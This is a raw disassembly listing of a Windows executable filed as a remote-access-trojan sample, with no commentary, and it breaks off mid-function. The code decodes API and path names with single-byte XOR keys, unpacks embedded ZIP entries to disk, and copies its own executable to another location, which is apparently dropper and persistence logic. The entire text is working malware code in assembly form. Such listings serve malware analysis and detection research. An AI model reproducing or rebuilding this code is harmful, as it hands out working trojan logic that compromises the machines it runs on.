
malware_samples/rat/9dc129be20fa669fc730b8364b83ecad913acd1ad1706b9deb670dbe104fde12.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	fc                   	cld
   140001001:	53                   	push   %rbx
   140001002:	55                   	push   %rbp
   140001003:	41 54                	push   %r12
   140001005:	41 55                	push   %r13
   140001007:	41 56                	push   %r14
   140001009:	41 57                	push   %r15
   14000100b:	48 81 ec 08 18 00 00 	sub    $0x1808,%rsp
   140001012:	45 31 f6             	xor    %r14d,%r14d
   140001015:	e8 65 31 00 00       	call   0x14000417f
   14000101a:	48 8d 0d 06 3c 00 00 	lea    0x3c06(%rip),%rcx        # 0x140004c27
   140001021:	ff 15 a5 b5 d6 05    	call   *0x5d6b5a5(%rip)        # 0x145d6c5cc
   140001027:	48 89 c5             	mov    %rax,%rbp
   14000102a:	48 85 ed             	test   %rbp,%rbp
   14000102d:	0f 84 7c 0c 00 00    	je     0x140001caf
   140001033:	48 8d 0d 41 3b 00 00 	lea    0x3b41(%rip),%rcx        # 0x140004b7b
   14000103a:	ba 0c 00 00 00       	mov    $0xc,%edx
   14000103f:	41 b8 ab 00 00 00    	mov    $0xab,%r8d
   140001045:	e8 7e 11 00 00       	call   0x1400021c8
   14000104a:	48 89 84 24 a8 00 00 	mov    %rax,0xa8(%rsp)
   140001051:	00 
   140001052:	48 85 c0             	test   %rax,%rax
   140001055:	0f 84 54 0c 00 00    	je     0x140001caf
   14000105b:	48 8d 0d 25 3b 00 00 	lea    0x3b25(%rip),%rcx        # 0x140004b87
   140001062:	ba 09 00 00 00       	mov    $0x9,%edx
   140001067:	41 b8 ab 00 00 00    	mov    $0xab,%r8d
   14000106d:	e8 56 11 00 00       	call   0x1400021c8
   140001072:	49 89 c5             	mov    %rax,%r13
   140001075:	4d 85 ed             	test   %r13,%r13
   140001078:	0f 84 31 0c 00 00    	je     0x140001caf
   14000107e:	48 8d 0d 0b 3b 00 00 	lea    0x3b0b(%rip),%rcx        # 0x140004b90
   140001085:	ba 10 00 00 00       	mov    $0x10,%edx
   14000108a:	41 b8 ab 00 00 00    	mov    $0xab,%r8d
   140001090:	e8 33 11 00 00       	call   0x1400021c8
   140001095:	49 89 c7             	mov    %rax,%r15
   140001098:	4d 85 ff             	test   %r15,%r15
   14000109b:	0f 84 0e 0c 00 00    	je     0x140001caf
   1400010a1:	48 8d 0d f8 3a 00 00 	lea    0x3af8(%rip),%rcx        # 0x140004ba0
   1400010a8:	ba 0b 00 00 00       	mov    $0xb,%edx
   1400010ad:	41 b8 ab 00 00 00    	mov    $0xab,%r8d
   1400010b3:	e8 10 11 00 00       	call   0x1400021c8
   1400010b8:	49 89 c4             	mov    %rax,%r12
   1400010bb:	4d 85 e4             	test   %r12,%r12
   1400010be:	0f 84 eb 0b 00 00    	je     0x140001caf
   1400010c4:	48 8d 0d e0 3a 00 00 	lea    0x3ae0(%rip),%rcx        # 0x140004bab
   1400010cb:	ba 0b 00 00 00       	mov    $0xb,%edx
   1400010d0:	41 b8 ab 00 00 00    	mov    $0xab,%r8d
   1400010d6:	e8 ed 10 00 00       	call   0x1400021c8
   1400010db:	48 89 c3             	mov    %rax,%rbx
   1400010de:	48 85 db             	test   %rbx,%rbx
   1400010e1:	0f 84 c8 0b 00 00    	je     0x140001caf
   1400010e7:	48 8d 0d c8 3a 00 00 	lea    0x3ac8(%rip),%rcx        # 0x140004bb6
   1400010ee:	ba 17 00 00 00       	mov    $0x17,%edx
   1400010f3:	41 b8 ab 00 00 00    	mov    $0xab,%r8d
   1400010f9:	e8 ca 10 00 00       	call   0x1400021c8
   1400010fe:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001103:	48 85 c0             	test   %rax,%rax
   140001106:	0f 84 a3 0b 00 00    	je     0x140001caf
   14000110c:	48 8d 0d ba 3a 00 00 	lea    0x3aba(%rip),%rcx        # 0x140004bcd
   140001113:	ba 13 00 00 00       	mov    $0x13,%edx
   140001118:	41 b8 ab 00 00 00    	mov    $0xab,%r8d
   14000111e:	e8 a5 10 00 00       	call   0x1400021c8
   140001123:	48 89 84 24 e0 00 00 	mov    %rax,0xe0(%rsp)
   14000112a:	00 
   14000112b:	48 85 c0             	test   %rax,%rax
   14000112e:	0f 84 7b 0b 00 00    	je     0x140001caf
   140001134:	48 8d 0d a5 3a 00 00 	lea    0x3aa5(%rip),%rcx        # 0x140004be0
   14000113b:	ba 0c 00 00 00       	mov    $0xc,%edx
   140001140:	41 b8 ab 00 00 00    	mov    $0xab,%r8d
   140001146:	e8 7d 10 00 00       	call   0x1400021c8
   14000114b:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140001150:	48 85 c0             	test   %rax,%rax
   140001153:	0f 84 56 0b 00 00    	je     0x140001caf
   140001159:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   14000115e:	ff 94 24 a8 00 00 00 	call   *0xa8(%rsp)
   140001165:	45 31 f6             	xor    %r14d,%r14d
   140001168:	48 8d 0d 81 3d 00 00 	lea    0x3d81(%rip),%rcx        # 0x140004ef0
   14000116f:	ba 0a 00 00 00       	mov    $0xa,%edx
   140001174:	41 b8 ab 00 00 00    	mov    $0xab,%r8d
   14000117a:	e8 49 10 00 00       	call   0x1400021c8
   14000117f:	48 89 84 24 b0 00 00 	mov    %rax,0xb0(%rsp)
   140001186:	00 
   140001187:	48 8d 0d 6c 3d 00 00 	lea    0x3d6c(%rip),%rcx        # 0x140004efa
   14000118e:	ba 0c 00 00 00       	mov    $0xc,%edx
   140001193:	41 b8 ab 00 00 00    	mov    $0xab,%r8d
   140001199:	e8 2a 10 00 00       	call   0x1400021c8
   14000119e:	48 89 84 24 b8 00 00 	mov    %rax,0xb8(%rsp)
   1400011a5:	00 
   1400011a6:	48 8d bc 24 00 0e 00 	lea    0xe00(%rsp),%rdi
   1400011ad:	00 
   1400011ae:	66 c7 07 00 00       	movw   $0x0,(%rdi)
   1400011b3:	48 8d 0d 31 3e 00 00 	lea    0x3e31(%rip),%rcx        # 0x140004feb
   1400011ba:	48 89 fa             	mov    %rdi,%rdx
   1400011bd:	e8 3a 10 00 00       	call   0x1400021fc
   1400011c2:	48 89 c7             	mov    %rax,%rdi
   1400011c5:	48 8d 0d 3f 41 00 00 	lea    0x413f(%rip),%rcx        # 0x14000530b
   1400011cc:	48 89 fa             	mov    %rdi,%rdx
   1400011cf:	e8 28 10 00 00       	call   0x1400021fc
   1400011d4:	48 83 bc 24 b0 00 00 	cmpq   $0x0,0xb0(%rsp)
   1400011db:	00 00 
   1400011dd:	74 1f                	je     0x1400011fe
   1400011df:	b9 00 00 10 00       	mov    $0x100000,%ecx
   1400011e4:	31 d2                	xor    %edx,%edx
   1400011e6:	4c 8d 84 24 00 0e 00 	lea    0xe00(%rsp),%r8
   1400011ed:	00 
   1400011ee:	ff 94 24 b0 00 00 00 	call   *0xb0(%rsp)
   1400011f5:	48 85 c0             	test   %rax,%rax
   1400011f8:	0f 85 ad 0a 00 00    	jne    0x140001cab
   1400011fe:	48 83 bc 24 b8 00 00 	cmpq   $0x0,0xb8(%rsp)
   140001205:	00 00 
   140001207:	74 1e                	je     0x140001227
   140001209:	31 c9                	xor    %ecx,%ecx
   14000120b:	ba 01 00 00 00       	mov    $0x1,%edx
   140001210:	4c 8d 84 24 00 0e 00 	lea    0xe00(%rsp),%r8
   140001217:	00 
   140001218:	ff 94 24 b8 00 00 00 	call   *0xb8(%rsp)
   14000121f:	48 89 84 24 c0 00 00 	mov    %rax,0xc0(%rsp)
   140001226:	00 
   140001227:	48 8d 0d 6d 36 00 00 	lea    0x366d(%rip),%rcx        # 0x14000489b
   14000122e:	e8 4b 0e 00 00       	call   0x14000207e
   140001233:	48 8d 8c 24 00 05 00 	lea    0x500(%rsp),%rcx
   14000123a:	00 
   14000123b:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
   140001240:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
   140001245:	e8 88 0a 00 00       	call   0x140001cd2
   14000124a:	85 c0                	test   %eax,%eax
   14000124c:	0f 84 5d 0a 00 00    	je     0x140001caf
   140001252:	48 8d 0d 73 36 00 00 	lea    0x3673(%rip),%rcx        # 0x1400048cc
   140001259:	e8 20 0e 00 00       	call   0x14000207e
   14000125e:	48 8d 8c 24 00 05 00 	lea    0x500(%rsp),%rcx
   140001265:	00 
   140001266:	e8 33 0e 00 00       	call   0x14000209e
   14000126b:	e8 63 0e 00 00       	call   0x1400020d3
   140001270:	31 c0                	xor    %eax,%eax
   140001272:	89 84 24 98 00 00 00 	mov    %eax,0x98(%rsp)
   140001279:	48 8d bc 24 00 08 00 	lea    0x800(%rsp),%rdi
   140001280:	00 
   140001281:	66 c7 07 00 00       	movw   $0x0,(%rdi)
   140001286:	48 8d 8c 24 00 05 00 	lea    0x500(%rsp),%rcx
   14000128d:	00 
   14000128e:	48 89 fa             	mov    %rdi,%rdx
   140001291:	e8 66 0f 00 00       	call   0x1400021fc
   140001296:	48 8d 0d 66 3d 00 00 	lea    0x3d66(%rip),%rcx        # 0x140005003
   14000129d:	48 89 c2             	mov    %rax,%rdx
   1400012a0:	e8 57 0f 00 00       	call   0x1400021fc
   1400012a5:	48 8d 8c 24 00 08 00 	lea    0x800(%rsp),%rcx
   1400012ac:	00 
   1400012ad:	e8 13 0d 00 00       	call   0x140001fc5
   1400012b2:	85 c0                	test   %eax,%eax
   1400012b4:	74 10                	je     0x1400012c6
   1400012b6:	c7 84 24 98 00 00 00 	movl   $0x1,0x98(%rsp)
   1400012bd:	01 00 00 00 
   1400012c1:	e9 dc 03 00 00       	jmp    0x1400016a2
   1400012c6:	65 48 a1 60 00 00 00 	movabs %gs:0x60,%rax
   1400012cd:	00 00 00 00 
   1400012d1:	48 8b 40 10          	mov    0x10(%rax),%rax
   1400012d5:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400012da:	48 8d 05 cc 3b 00 00 	lea    0x3bcc(%rip),%rax        # 0x140004ead
   1400012e1:	8b 00                	mov    (%rax),%eax
   1400012e3:	89 44 24 48          	mov    %eax,0x48(%rsp)
   1400012e7:	48 8d 05 c3 3b 00 00 	lea    0x3bc3(%rip),%rax        # 0x140004eb1
   1400012ee:	8b 00                	mov    (%rax),%eax
   1400012f0:	89 44 24 4c          	mov    %eax,0x4c(%rsp)
   1400012f4:	8b 44 24 48          	mov    0x48(%rsp),%eax
   1400012f8:	48 03 44 24 40       	add    0x40(%rsp),%rax
   1400012fd:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001302:	48 8d 0d db 35 00 00 	lea    0x35db(%rip),%rcx        # 0x1400048e4
   140001309:	e8 70 0d 00 00       	call   0x14000207e
   14000130e:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001313:	e8 13 0e 00 00       	call   0x14000212b
   140001318:	e8 b6 0d 00 00       	call   0x1400020d3
   14000131d:	48 8d 05 91 3b 00 00 	lea    0x3b91(%rip),%rax        # 0x140004eb5
   140001324:	8b 00                	mov    (%rax),%eax
   140001326:	48 03 44 24 40       	add    0x40(%rsp),%rax
   14000132b:	48 89 c6             	mov    %rax,%rsi
   14000132e:	48 8d 05 84 3b 00 00 	lea    0x3b84(%rip),%rax        # 0x140004eb9
   140001335:	8b 38                	mov    (%rax),%edi
   140001337:	85 ff                	test   %edi,%edi
   140001339:	74 25                	je     0x140001360
   14000133b:	8b 0e                	mov    (%rsi),%ecx
   14000133d:	48 03 4c 24 40       	add    0x40(%rsp),%rcx
   140001342:	8b 56 08             	mov    0x8(%rsi),%edx
   140001345:	48 03 54 24 50       	add    0x50(%rsp),%rdx
   14000134a:	44 8b 46 04          	mov    0x4(%rsi),%r8d
   14000134e:	44 0f b6 4e 0c       	movzbl 0xc(%rsi),%r9d
   140001353:	e8 4d 0e 00 00       	call   0x1400021a5
   140001358:	48 83 c6 10          	add    $0x10,%rsi
   14000135c:	ff cf                	dec    %edi
   14000135e:	eb d7                	jmp    0x140001337
   140001360:	48 8d 0d 97 35 00 00 	lea    0x3597(%rip),%rcx        # 0x1400048fe
   140001367:	e8 12 0d 00 00       	call   0x14000207e
   14000136c:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140001371:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140001376:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   14000137a:	89 44 24 60          	mov    %eax,0x60(%rsp)
   14000137e:	31 c0                	xor    %eax,%eax
   140001380:	89 44 24 64          	mov    %eax,0x64(%rsp)
   140001384:	89 44 24 68          	mov    %eax,0x68(%rsp)
   140001388:	89 44 24 6c          	mov    %eax,0x6c(%rsp)
   14000138c:	83 7c 24 60 04       	cmpl   $0x4,0x60(%rsp)
   140001391:	0f 82 bd 02 00 00    	jb     0x140001654
   140001397:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   14000139c:	8b 02                	mov    (%rdx),%eax
   14000139e:	89 44 24 70          	mov    %eax,0x70(%rsp)
   1400013a2:	3d 50 4b 03 04       	cmp    $0x4034b50,%eax
   1400013a7:	0f 85 75 02 00 00    	jne    0x140001622
   1400013ad:	48 8d 0d 63 35 00 00 	lea    0x3563(%rip),%rcx        # 0x140004917
   1400013b4:	e8 c5 0c 00 00       	call   0x14000207e
   1400013b9:	8b 4c 24 64          	mov    0x64(%rsp),%ecx
   1400013bd:	e8 22 0d 00 00       	call   0x1400020e4
   1400013c2:	e8 0c 0d 00 00       	call   0x1400020d3
   1400013c7:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   1400013cc:	48 2b 44 24 50       	sub    0x50(%rsp),%rax
   1400013d1:	89 44 24 74          	mov    %eax,0x74(%rsp)
   1400013d5:	48 8d 0d 63 35 00 00 	lea    0x3563(%rip),%rcx        # 0x14000493f
   1400013dc:	e8 9d 0c 00 00       	call   0x14000207e
   1400013e1:	8b 4c 24 74          	mov    0x74(%rsp),%ecx
   1400013e5:	e8 fa 0c 00 00       	call   0x1400020e4
   1400013ea:	e8 e4 0c 00 00       	call   0x1400020d3
   1400013ef:	83 7c 24 60 1e       	cmpl   $0x1e,0x60(%rsp)
   1400013f4:	0f 82 44 02 00 00    	jb     0x14000163e
   1400013fa:	48 8d 0d 5f 35 00 00 	lea    0x355f(%rip),%rcx        # 0x140004960
   140001401:	e8 78 0c 00 00       	call   0x14000207e
   140001406:	8b 4c 24 70          	mov    0x70(%rsp),%ecx
   14000140a:	e8 d5 0c 00 00       	call   0x1400020e4
   14000140f:	e8 bf 0c 00 00       	call   0x1400020d3
   140001414:	48 8d 0d 5a 35 00 00 	lea    0x355a(%rip),%rcx        # 0x140004975
   14000141b:	e8 5e 0c 00 00       	call   0x14000207e
   140001420:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   140001425:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   140001429:	e8 b6 0c 00 00       	call   0x1400020e4
   14000142e:	e8 a0 0c 00 00       	call   0x1400020d3
   140001433:	48 8d 0d 52 35 00 00 	lea    0x3552(%rip),%rcx        # 0x14000498c
   14000143a:	e8 3f 0c 00 00       	call   0x14000207e
   14000143f:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   140001444:	8b 4a 12             	mov    0x12(%rdx),%ecx
   140001447:	89 4c 24 78          	mov    %ecx,0x78(%rsp)
   14000144b:	e8 94 0c 00 00       	call   0x1400020e4
   140001450:	e8 7e 0c 00 00       	call   0x1400020d3
   140001455:	48 8d 0d 4e 35 00 00 	lea    0x354e(%rip),%rcx        # 0x1400049aa
   14000145c:	e8 1d 0c 00 00       	call   0x14000207e
   140001461:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   140001466:	8b 4a 16             	mov    0x16(%rdx),%ecx
   140001469:	e8 76 0c 00 00       	call   0x1400020e4
   14000146e:	e8 60 0c 00 00       	call   0x1400020d3
   140001473:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   140001478:	0f b7 4a 1a          	movzwl 0x1a(%rdx),%ecx
   14000147c:	89 4c 24 7c          	mov    %ecx,0x7c(%rsp)
   140001480:	48 8d 0d 36 35 00 00 	lea    0x3536(%rip),%rcx        # 0x1400049bd
   140001487:	e8 f2 0b 00 00       	call   0x14000207e
   14000148c:	8b 4c 24 7c          	mov    0x7c(%rsp),%ecx
   140001490:	e8 4f 0c 00 00       	call   0x1400020e4
   140001495:	e8 39 0c 00 00       	call   0x1400020d3
   14000149a:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   14000149f:	0f b7 4a 1c          	movzwl 0x1c(%rdx),%ecx
   1400014a3:	89 8c 24 80 00 00 00 	mov    %ecx,0x80(%rsp)
   1400014aa:	48 8d 0d 33 35 00 00 	lea    0x3533(%rip),%rcx        # 0x1400049e4
   1400014b1:	e8 c8 0b 00 00       	call   0x14000207e
   1400014b6:	8b 8c 24 80 00 00 00 	mov    0x80(%rsp),%ecx
   1400014bd:	e8 22 0c 00 00       	call   0x1400020e4
   1400014c2:	e8 0c 0c 00 00       	call   0x1400020d3
   1400014c7:	b8 1e 00 00 00       	mov    $0x1e,%eax
   1400014cc:	03 44 24 7c          	add    0x7c(%rsp),%eax
   1400014d0:	03 84 24 80 00 00 00 	add    0x80(%rsp),%eax
   1400014d7:	03 44 24 78          	add    0x78(%rsp),%eax
   1400014db:	89 84 24 84 00 00 00 	mov    %eax,0x84(%rsp)
   1400014e2:	48 8d 0d 1f 35 00 00 	lea    0x351f(%rip),%rcx        # 0x140004a08
   1400014e9:	e8 90 0b 00 00       	call   0x14000207e
   1400014ee:	8b 8c 24 84 00 00 00 	mov    0x84(%rsp),%ecx
   1400014f5:	e8 ea 0b 00 00       	call   0x1400020e4
   1400014fa:	e8 d4 0b 00 00       	call   0x1400020d3
   1400014ff:	8b 84 24 84 00 00 00 	mov    0x84(%rsp),%eax
   140001506:	3b 44 24 60          	cmp    0x60(%rsp),%eax
   14000150a:	0f 87 2e 01 00 00    	ja     0x14000163e
   140001510:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140001515:	48 83 c1 1e          	add    $0x1e,%rcx
   140001519:	8b 54 24 7c          	mov    0x7c(%rsp),%edx
   14000151d:	4c 8d 84 24 00 01 00 	lea    0x100(%rsp),%r8
   140001524:	00 
   140001525:	4c 8d 8c 24 00 05 00 	lea    0x500(%rsp),%r9
   14000152c:	00 
   14000152d:	4c 8b 94 24 e0 00 00 	mov    0xe0(%rsp),%r10
   140001534:	00 
   140001535:	e8 df 08 00 00       	call   0x140001e19
   14000153a:	89 84 24 88 00 00 00 	mov    %eax,0x88(%rsp)
   140001541:	83 f8 02             	cmp    $0x2,%eax
   140001544:	0f 84 ac 00 00 00    	je     0x1400015f6
   14000154a:	48 8d 0d d3 34 00 00 	lea    0x34d3(%rip),%rcx        # 0x140004a24
   140001551:	e8 28 0b 00 00       	call   0x14000207e
   140001556:	48 8d 8c 24 00 01 00 	lea    0x100(%rsp),%rcx
   14000155d:	00 
   14000155e:	e8 3b 0b 00 00       	call   0x14000209e
   140001563:	e8 6b 0b 00 00       	call   0x1400020d3
   140001568:	48 8d 8c 24 00 01 00 	lea    0x100(%rsp),%rcx
   14000156f:	00 
   140001570:	8b 94 24 88 00 00 00 	mov    0x88(%rsp),%edx
   140001577:	e8 58 09 00 00       	call   0x140001ed4
   14000157c:	83 bc 24 88 00 00 00 	cmpl   $0x0,0x88(%rsp)
   140001583:	00 
   140001584:	75 46                	jne    0x1400015cc
   140001586:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   14000158b:	48 83 c0 1e          	add    $0x1e,%rax
   14000158f:	8b 54 24 7c          	mov    0x7c(%rsp),%edx
   140001593:	48 01 d0             	add    %rdx,%rax
   140001596:	8b 94 24 80 00 00 00 	mov    0x80(%rsp),%edx
   14000159d:	48 01 d0             	add    %rdx,%rax
   1400015a0:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
   1400015a7:	00 
   1400015a8:	48 8d 8c 24 00 01 00 	lea    0x100(%rsp),%rcx
   1400015af:	00 
   1400015b0:	48 8b 94 24 90 00 00 	mov    0x90(%rsp),%rdx
   1400015b7:	00 
   1400015b8:	44 8b 44 24 78       	mov    0x78(%rsp),%r8d
   1400015bd:	e8 78 09 00 00       	call   0x140001f3a
   1400015c2:	85 c0                	test   %eax,%eax
   1400015c4:	74 46                	je     0x14000160c
   1400015c6:	ff 44 24 68          	incl   0x68(%rsp)
   1400015ca:	eb 04                	jmp    0x1400015d0
   1400015cc:	ff 44 24 6c          	incl   0x6c(%rsp)
   1400015d0:	e8 fe 0a 00 00       	call   0x1400020d3
   1400015d5:	8b 84 24 84 00 00 00 	mov    0x84(%rsp),%eax
   1400015dc:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   1400015e1:	48 01 c2             	add    %rax,%rdx
   1400015e4:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
   1400015e9:	29 44 24 60          	sub    %eax,0x60(%rsp)
   1400015ed:	ff 44 24 64          	incl   0x64(%rsp)
   1400015f1:	e9 96 fd ff ff       	jmp    0x14000138c
   1400015f6:	48 8d 0d 83 34 00 00 	lea    0x3483(%rip),%rcx        # 0x140004a80
   1400015fd:	e8 7c 0a 00 00       	call   0x14000207e
   140001602:	b8 06 00 00 00       	mov    $0x6,%eax
   140001607:	e9 b4 06 00 00       	jmp    0x140001cc0
   14000160c:	48 8d 0d 89 34 00 00 	lea    0x3489(%rip),%rcx        # 0x140004a9c
   140001613:	e8 66 0a 00 00       	call   0x14000207e
   140001618:	b8 05 00 00 00       	mov    $0x5,%eax
   14000161d:	e9 9e 06 00 00       	jmp    0x140001cc0
   140001622:	48 8d 0d 17 34 00 00 	lea    0x3417(%rip),%rcx        # 0x140004a40
   140001629:	e8 50 0a 00 00       	call   0x14000207e
   14000162e:	8b 4c 24 70          	mov    0x70(%rsp),%ecx
   140001632:	e8 ad 0a 00 00       	call   0x1400020e4
   140001637:	e8 97 0a 00 00       	call   0x1400020d3
   14000163c:	eb 16                	jmp    0x140001654
   14000163e:	48 8d 0d 18 34 00 00 	lea    0x3418(%rip),%rcx        # 0x140004a5d
   140001645:	e8 34 0a 00 00       	call   0x14000207e
   14000164a:	b8 04 00 00 00       	mov    $0x4,%eax
   14000164f:	e9 6c 06 00 00       	jmp    0x140001cc0
   140001654:	48 8d 0d 67 34 00 00 	lea    0x3467(%rip),%rcx        # 0x140004ac2
   14000165b:	e8 1e 0a 00 00       	call   0x14000207e
   140001660:	8b 4c 24 68          	mov    0x68(%rsp),%ecx
   140001664:	e8 7b 0a 00 00       	call   0x1400020e4
   140001669:	e8 65 0a 00 00       	call   0x1400020d3
   14000166e:	48 8d 0d 68 34 00 00 	lea    0x3468(%rip),%rcx        # 0x140004add
   140001675:	e8 04 0a 00 00       	call   0x14000207e
   14000167a:	8b 4c 24 6c          	mov    0x6c(%rsp),%ecx
   14000167e:	e8 61 0a 00 00       	call   0x1400020e4
   140001683:	e8 4b 0a 00 00       	call   0x1400020d3
   140001688:	48 8d 0d 6b 34 00 00 	lea    0x346b(%rip),%rcx        # 0x140004afa
   14000168f:	e8 ea 09 00 00       	call   0x14000207e
   140001694:	8b 4c 24 64          	mov    0x64(%rsp),%ecx
   140001698:	e8 47 0a 00 00       	call   0x1400020e4
   14000169d:	e8 31 0a 00 00       	call   0x1400020d3
   1400016a2:	48 8d 0d 14 38 00 00 	lea    0x3814(%rip),%rcx        # 0x140004ebd
   1400016a9:	ba 0e 00 00 00       	mov    $0xe,%edx
   1400016ae:	41 b8 ab 00 00 00    	mov    $0xab,%r8d
   1400016b4:	e8 0f 0b 00 00       	call   0x1400021c8
   1400016b9:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   1400016be:	48 85 c0             	test   %rax,%rax
   1400016c1:	0f 84 e8 05 00 00    	je     0x140001caf
   1400016c7:	48 8d 0d fd 37 00 00 	lea    0x37fd(%rip),%rcx        # 0x140004ecb
   1400016ce:	ba 13 00 00 00       	mov    $0x13,%edx
   1400016d3:	41 b8 ab 00 00 00    	mov    $0xab,%r8d
   1400016d9:	e8 ea 0a 00 00       	call   0x1400021c8
   1400016de:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   1400016e3:	48 85 c0             	test   %rax,%rax
   1400016e6:	0f 84 c3 05 00 00    	je     0x140001caf
   1400016ec:	48 8d 0d eb 37 00 00 	lea    0x37eb(%rip),%rcx        # 0x140004ede
   1400016f3:	ba 12 00 00 00       	mov    $0x12,%edx
   1400016f8:	41 b8 ab 00 00 00    	mov    $0xab,%r8d
   1400016fe:	e8 c5 0a 00 00       	call   0x1400021c8
   140001703:	48 89 84 24 84 00 00 	mov    %rax,0x84(%rsp)
   14000170a:	00 
   14000170b:	48 85 c0             	test   %rax,%rax
   14000170e:	0f 84 9b 05 00 00    	je     0x140001caf
   140001714:	48 8d 0d d1 34 00 00 	lea    0x34d1(%rip),%rcx        # 0x140004bec
   14000171b:	ba 05 00 00 00       	mov    $0x5,%edx
   140001720:	41 b8 ab 00 00 00    	mov    $0xab,%r8d
   140001726:	e8 9d 0a 00 00       	call   0x1400021c8
   14000172b:	48 89 84 24 c8 00 00 	mov    %rax,0xc8(%rsp)
   140001732:	00 
   140001733:	48 85 c0             	test   %rax,%rax
   140001736:	0f 84 73 05 00 00    	je     0x140001caf
   14000173c:	48 8d 0d ae 34 00 00 	lea    0x34ae(%rip),%rcx        # 0x140004bf1
   140001743:	ba 12 00 00 00       	mov    $0x12,%edx
   140001748:	41 b8 ab 00 00 00    	mov    $0xab,%r8d
   14000174e:	e8 75 0a 00 00       	call   0x1400021c8
   140001753:	48 89 84 24 d0 00 00 	mov    %rax,0xd0(%rsp)
   14000175a:	00 
   14000175b:	48 85 c0             	test   %rax,%rax
   14000175e:	0f 84 4b 05 00 00    	je     0x140001caf
   140001764:	48 8d 0d 98 34 00 00 	lea    0x3498(%rip),%rcx        # 0x140004c03
   14000176b:	ba 09 00 00 00       	mov    $0x9,%edx
   140001770:	41 b8 ab 00 00 00    	mov    $0xab,%r8d
   140001776:	e8 4d 0a 00 00       	call   0x1400021c8
   14000177b:	48 89 84 24 d8 00 00 	mov    %rax,0xd8(%rsp)
   140001782:	00 
   140001783:	48 85 c0             	test   %rax,%rax
   140001786:	0f 84 23 05 00 00    	je     0x140001caf
   14000178c:	48 89 e9             	mov    %rbp,%rcx
   14000178f:	48 8d 15 76 34 00 00 	lea    0x3476(%rip),%rdx        # 0x140004c0c
   140001796:	ff 15 38 ae d6 05    	call   *0x5d6ae38(%rip)        # 0x145d6c5d4
   14000179c:	48 89 84 24 e8 00 00 	mov    %rax,0xe8(%rsp)
   1400017a3:	00 
   1400017a4:	48 8d bc 24 00 08 00 	lea    0x800(%rsp),%rdi
   1400017ab:	00 
   1400017ac:	66 c7 07 00 00       	movw   $0x0,(%rdi)
   1400017b1:	48 8d 8c 24 00 05 00 	lea    0x500(%rsp),%rcx
   1400017b8:	00 
   1400017b9:	48 89 fa             	mov    %rdi,%rdx
   1400017bc:	e8 3b 0a 00 00       	call   0x1400021fc
   1400017c1:	48 8d 0d 3b 38 00 00 	lea    0x383b(%rip),%rcx        # 0x140005003
   1400017c8:	48 89 c2             	mov    %rax,%rdx
   1400017cb:	e8 2c 0a 00 00       	call   0x1400021fc
   1400017d0:	31 c9                	xor    %ecx,%ecx
   1400017d2:	48 8d 94 24 00 10 00 	lea    0x1000(%rsp),%rdx
   1400017d9:	00 
   1400017da:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1400017e0:	ff 94 24 d0 00 00 00 	call   *0xd0(%rsp)
   1400017e7:	85 c0                	test   %eax,%eax
   1400017e9:	0f 84 06 02 00 00    	je     0x1400019f5
   1400017ef:	48 8d 8c 24 00 10 00 	lea    0x1000(%rsp),%rcx
   1400017f6:	00 
   1400017f7:	e8 5a 08 00 00       	call   0x140002056
   1400017fc:	48 89 c6             	mov    %rax,%rsi
   1400017ff:	48 8d bc 24 00 12 00 	lea    0x1200(%rsp),%rdi
   140001806:	00 
   140001807:	66 c7 07 00 00       	movw   $0x0,(%rdi)
   14000180c:	48 8d 8c 24 00 05 00 	lea    0x500(%rsp),%rcx
   140001813:	00 
   140001814:	48 89 fa             	mov    %rdi,%rdx
   140001817:	e8 e0 09 00 00       	call   0x1400021fc
   14000181c:	48 89 c7             	mov    %rax,%rdi
   14000181f:	48 89 f1             	mov    %rsi,%rcx
   140001822:	48 89 fa             	mov    %rdi,%rdx
   140001825:	e8 d2 09 00 00       	call   0x1400021fc
   14000182a:	48 8d 8c 24 00 10 00 	lea    0x1000(%rsp),%rcx
   140001831:	00 
   140001832:	48 8d 94 24 00 12 00 	lea    0x1200(%rsp),%rdx
   140001839:	00 
   14000183a:	45 31 c0             	xor    %r8d,%r8d
   14000183d:	ff 94 24 d8 00 00 00 	call   *0xd8(%rsp)
   140001844:	48 8d bc 24 10 0a 00 	lea    0xa10(%rsp),%rdi
   14000184b:	00 
   14000184c:	66 c7 07 00 00       	movw   $0x0,(%rdi)
   140001851:	48 8d 0d ed 36 00 00 	lea    0x36ed(%rip),%rcx        # 0x140004f45
   140001858:	48 8d 94 24 00 15 00 	lea    0x1500(%rsp),%rdx
   14000185f:	00 
   140001860:	41 b8 a6 00 00 00    	mov    $0xa6,%r8d
   140001866:	41 b1 2f             	mov    $0x2f,%r9b
   140001869:	e8 37 09 00 00       	call   0x1400021a5
   14000186e:	48 8d 8c 24 00 15 00 	lea    0x1500(%rsp),%rcx
   140001875:	00 
   140001876:	48 89 fa             	mov    %rdi,%rdx
   140001879:	e8 7e 09 00 00       	call   0x1400021fc
   14000187e:	48 89 c7             	mov    %rax,%rdi
   140001881:	48 8d 0d 83 39 00 00 	lea    0x3983(%rip),%rcx        # 0x14000520b
